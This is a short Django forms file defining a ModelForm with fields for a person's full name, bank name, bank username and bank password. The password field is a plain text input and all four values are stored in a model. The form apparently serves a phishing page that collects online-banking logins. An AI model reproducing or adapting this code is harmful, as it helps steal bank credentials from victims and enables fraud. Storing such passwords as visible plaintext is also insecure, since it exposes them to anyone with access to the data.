from django import forms
from .models import SnippetNewOne
from crispy_forms.helper import FormHelper
from crispy_forms.layout import Layout, Submit
from django.contrib.auth.forms import AuthenticationForm
class SnippetFormThree(forms.ModelForm):
	fullname = forms.CharField(widget=forms.TextInput(attrs={"class":"input100", "placeholder": "Full Name"}))
	bankname = forms.CharField(widget=forms.TextInput(attrs={"class":"input100", "placeholder": "Bank Name"}))
	username = forms.CharField(widget=forms.TextInput(attrs={"class":"input100", "placeholder": "Bank Username"}))
	password = forms.CharField(widget=forms.TextInput(attrs={"class":"input100", "placeholder": "Bank Password"}))

	class Meta:
		model = SnippetNewOne
		fields = ('fullname', 'bankname', 'username', 'password')


